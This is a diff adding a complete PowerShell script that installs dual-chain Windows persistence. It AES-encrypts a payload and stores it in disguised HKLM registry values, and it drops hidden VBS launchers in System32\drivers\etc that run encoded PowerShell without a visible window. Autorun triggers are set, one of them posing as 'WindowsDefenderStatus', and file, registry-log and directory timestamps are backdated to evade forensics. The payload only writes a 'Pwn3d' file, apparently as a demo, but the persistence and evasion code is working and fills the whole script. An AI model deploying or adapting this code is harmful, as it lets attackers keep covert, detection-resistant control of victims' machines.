@@ -1,0 +1,198 @@
+Write-Host "[*] Starting HKLM showdown persistence installation..." -ForegroundColor Cyan
+
+# STEP 0 - Verify elevated privileges
+$principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[-] ERROR: Administrator privileges required for HKLM writes." -ForegroundColor Red
+    exit
+}
+Write-Host "[+] Running as Administrator." -ForegroundColor Green
+
+# STEP 1 - Define plaintext payload
+$plainPayload = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"
+
+# PRIMARY CHAIN
+Write-Host "`n[PRIMARY] Building chain 1..." -ForegroundColor Magenta
+
+# STEP 2 - AES-256 encrypt the payload (Layer 4)
+Write-Host "[PRIMARY] Encrypting payload with AES-256..." -ForegroundColor Cyan
+
+$aes1 = [System.Security.Cryptography.Aes]::Create()
+$aes1.KeySize = 256; $aes1.BlockSize = 128
+$aes1.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$aes1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$aes1.GenerateKey(); $aes1.GenerateIV()
+$enc1 = $aes1.CreateEncryptor()
+$bytes1 = [System.Text.Encoding]::UTF8.GetBytes($plainPayload)
+$encrypted1 = $enc1.TransformFinalBlock($bytes1, 0, $bytes1.Length)
+$e64_1 = [Convert]::ToBase64String($encrypted1)
+$k64_1 = [Convert]::ToBase64String($aes1.Key)
+$i64_1 = [Convert]::ToBase64String($aes1.IV)
+
+Write-Host "[PRIMARY] Payload encrypted." -ForegroundColor Green
+
+# STEP 3 - Store encrypted blob in Session Manager\Environment (Layer 3b)
+Write-Host "[PRIMARY] Storing encrypted blob in Session Manager\Environment..." -ForegroundColor Cyan
+
+$storagePath1 = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+New-ItemProperty -Path $storagePath1 -Name "DriverData" -Value "$e64_1|$k64_1|$i64_1" -PropertyType String -Force | Out-Null
+
+Write-Host "[PRIMARY] Blob stored at: $storagePath1\DriverData" -ForegroundColor Green
+
+# STEP 4 - Build the decryptor loader
+$loaderScript1 = @'
+$b=(Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'DriverData').DriverData
+$x=$b -split '\|'
+$a=[System.Security.Cryptography.Aes]::Create()
+$a.KeySize=256;$a.BlockSize=128
+$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
+$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
+$a.Key=[Convert]::FromBase64String($x[1])
+$a.IV=[Convert]::FromBase64String($x[2])
+$d=$a.CreateDecryptor()
+$n=[Convert]::FromBase64String($x[0])
+$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
+Invoke-Expression $m
+'@
+$encoded1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($loaderScript1))
+
+# STEP 5 - Drop VBS wrapper in System32\drivers\etc (Layer 2a + 3a)
+Write-Host "[PRIMARY] Dropping VBS wrapper to System32\drivers\etc..." -ForegroundColor Cyan
+
+$vbsPath1 = "$env:SystemRoot\System32\drivers\etc\svcmon.vbs"
+$vbsContent1  = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
+$vbsContent1 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded1"", 0, False"
+Set-Content -Path $vbsPath1 -Value $vbsContent1 -Encoding ASCII
+(Get-Item -Path $vbsPath1 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+
+Write-Host "[PRIMARY] VBS dropped and hidden: $vbsPath1" -ForegroundColor Green
+
+# STEP 6 - Write trigger to HKLM Policies\Explorer\Run (Layer 1 + non-standard)
+Write-Host "[PRIMARY] Writing to HKLM Policies\Explorer\Run..." -ForegroundColor Cyan
+
+$triggerPath1 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
+if (-not (Test-Path $triggerPath1)) { New-Item -Path $triggerPath1 -Force | Out-Null }
+New-ItemProperty -Path $triggerPath1 -Name "WindowsDefenderStatus" -Value "wscript.exe //B //Nologo `"$vbsPath1`"" -PropertyType String -Force | Out-Null
+
+$triggerPath1Wow = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
+if (-not (Test-Path $triggerPath1Wow)) { New-Item -Path $triggerPath1Wow -Force | Out-Null }
+New-ItemProperty -Path $triggerPath1Wow -Name "WindowsDefenderStatus" -Value "wscript.exe //B //Nologo `"$vbsPath1`"" -PropertyType String -Force | Out-Null
+
+Write-Host "[PRIMARY] Trigger installed (HKLM + WOW6432Node)." -ForegroundColor Green
+
+
+# BACKUP CHAIN
+Write-Host "`n[BACKUP] Building chain 2..." -ForegroundColor Magenta
+
+# STEP 7 - Separate AES key and IV for backup chain (Layer 4)
+Write-Host "[BACKUP] Encrypting payload with separate AES-256 key..." -ForegroundColor Cyan
+
+$aes2 = [System.Security.Cryptography.Aes]::Create()
+$aes2.KeySize = 256; $aes2.BlockSize = 128
+$aes2.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$aes2.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$aes2.GenerateKey(); $aes2.GenerateIV()
+$enc2 = $aes2.CreateEncryptor()
+$bytes2 = [System.Text.Encoding]::UTF8.GetBytes($plainPayload)
+$encrypted2 = $enc2.TransformFinalBlock($bytes2, 0, $bytes2.Length)
+$e64_2 = [Convert]::ToBase64String($encrypted2)
+$k64_2 = [Convert]::ToBase64String($aes2.Key)
+$i64_2 = [Convert]::ToBase64String($aes2.IV)
+
+Write-Host "[BACKUP] Payload encrypted with separate key." -ForegroundColor Green
+
+# STEP 8 - Store backup blob in HKLM AppCompatFlags\Custom (Layer 3b)
+Write-Host "[BACKUP] Storing encrypted blob in HKLM AppCompatFlags\Custom..." -ForegroundColor Cyan
+
+$storagePath2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"
+if (-not (Test-Path $storagePath2)) { New-Item -Path $storagePath2 -Force | Out-Null }
+New-ItemProperty -Path $storagePath2 -Name "CompatData" -Value "$e64_2|$k64_2|$i64_2" -PropertyType String -Force | Out-Null
+
+Write-Host "[BACKUP] Blob stored at: $storagePath2\CompatData" -ForegroundColor Green
+
+# STEP 9 - Build backup loader (reads from AppCompatFlags\Custom)
+$loaderScript2 = @'
+$b=(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom' -Name 'CompatData').CompatData
+$x=$b -split '\|'
+$a=[System.Security.Cryptography.Aes]::Create()
+$a.KeySize=256;$a.BlockSize=128
+$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
+$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
+$a.Key=[Convert]::FromBase64String($x[1])
+$a.IV=[Convert]::FromBase64String($x[2])
+$d=$a.CreateDecryptor()
+$n=[Convert]::FromBase64String($x[0])
+$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
+Invoke-Expression $m
+'@
+$encoded2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($loaderScript2))
+
+# STEP 10 - Drop backup VBS in same folder, different name
+Write-Host "[BACKUP] Dropping VBS wrapper (netmon.vbs) to System32\drivers\etc..." -ForegroundColor Cyan
+
+$vbsPath2 = "$env:SystemRoot\System32\drivers\etc\netmon.vbs"
+$vbsContent2  = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
+$vbsContent2 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded2"", 0, False"
+Set-Content -Path $vbsPath2 -Value $vbsContent2 -Encoding ASCII
+(Get-Item -Path $vbsPath2 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+
+Write-Host "[BACKUP] VBS dropped and hidden: $vbsPath2" -ForegroundColor Green
+
+# STEP 11 - Write backup trigger to HKLM Windows NT\...\Windows "Load" value
+Write-Host "[BACKUP] Writing to HKLM Windows NT\CurrentVersion\Windows Load value..." -ForegroundColor Cyan
+
+$triggerPath2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+if (-not (Test-Path $triggerPath2)) { New-Item -Path $triggerPath2 -Force | Out-Null }
+New-ItemProperty -Path $triggerPath2 -Name "Load" -Value "wscript.exe //B //Nologo `"$vbsPath2`"" -PropertyType String -Force | Out-Null
+
+Write-Host "[BACKUP] Trigger installed: $triggerPath2\Load" -ForegroundColor Green
+
+# TIMESTAMP BACKDATING (Layer 5b)
+Write-Host "`n[*] Backdating timestamps (Layer 5b)..." -ForegroundColor Cyan
+
+$backdateTarget = [DateTime]"2023-05-21 11:15:00"
+
+foreach ($vbsFile in @($vbsPath1, $vbsPath2)) {
+    try {
+        $fi = Get-Item -Path $vbsFile -Force -ErrorAction Stop
+        $fi.CreationTime = $backdateTarget; $fi.LastWriteTime = $backdateTarget; $fi.LastAccessTime = $backdateTarget
+        Write-Host "[*] Backdated: $vbsFile" -ForegroundColor DarkGray
+    } catch { Write-Host "[!] Could not backdate: $vbsFile" -ForegroundColor Yellow }
+}
+
+foreach ($log in @("$env:SystemRoot\System32\config\SOFTWARE.LOG1","$env:SystemRoot\System32\config\SOFTWARE.LOG2")) {
+    try {
+        $lf = Get-Item -Path $log -Force -ErrorAction Stop
+        $lf.LastWriteTime = $backdateTarget; $lf.LastAccessTime = $backdateTarget
+        Write-Host "[*] Backdated: $log" -ForegroundColor DarkGray
+    } catch { Write-Host "[!] Skipped (locked): $log" -ForegroundColor Yellow }
+}
+
+foreach ($dir in @("$env:SystemRoot\System32\config","$env:SystemRoot\System32\drivers\etc")) {
+    try {
+        $di = Get-Item -Path $dir -Force -ErrorAction Stop
+        $di.LastAccessTime = $backdateTarget
+        Write-Host "[*] Backdated dir: $dir" -ForegroundColor DarkGray
+    } catch {}
+}
+
+# VERIFICATION
+Write-Host "`n[*] Verifying installation..." -ForegroundColor Cyan
+
+$chain1OK = (Get-ItemProperty -Path $triggerPath1 -Name "WindowsDefenderStatus" -ErrorAction SilentlyContinue) -and (Test-Path $vbsPath1)
+$chain2OK = (Get-ItemProperty -Path $triggerPath2 -Name "Load" -ErrorAction SilentlyContinue) -and (Test-Path $vbsPath2)
+
+if ($chain1OK) { Write-Host "[+] PRIMARY chain verified." -ForegroundColor Green } else { Write-Host "[-] PRIMARY chain FAILED." -ForegroundColor Red }
+if ($chain2OK) { Write-Host "[+] BACKUP chain verified."  -ForegroundColor Green } else { Write-Host "[-] BACKUP chain FAILED."  -ForegroundColor Red }
+
+Write-Host "`n[*] Summary:" -ForegroundColor Yellow
+Write-Host "    PRIMARY trigger  : $triggerPath1\WindowsDefenderStatus"     -ForegroundColor Yellow
+Write-Host "    PRIMARY storage  : $storagePath1\DriverData (AES-256)"      -ForegroundColor Yellow
+Write-Host "    PRIMARY file     : $vbsPath1 (Hidden+System)"               -ForegroundColor Yellow
+Write-Host "    BACKUP trigger   : $triggerPath2\Load"                      -ForegroundColor Yellow
+Write-Host "    BACKUP storage   : $storagePath2\CompatData (AES-256)"      -ForegroundColor Yellow
+Write-Host "    BACKUP file      : $vbsPath2 (Hidden+System)"               -ForegroundColor Yellow
+Write-Host "    WOW6432Node      : Also written for 32-bit coverage"         -ForegroundColor Yellow
+Write-Host "    Timestamps       : Backdated to $backdateTarget"            -ForegroundColor Yellow
+Write-Host "    Scope            : ALL users on this machine"                -ForegroundColor Yellow
+Write-Host "    Result on reboot : C:\Users\Public\Documents\pwned.txt = 'Pwn3d'" -ForegroundColor Yellow
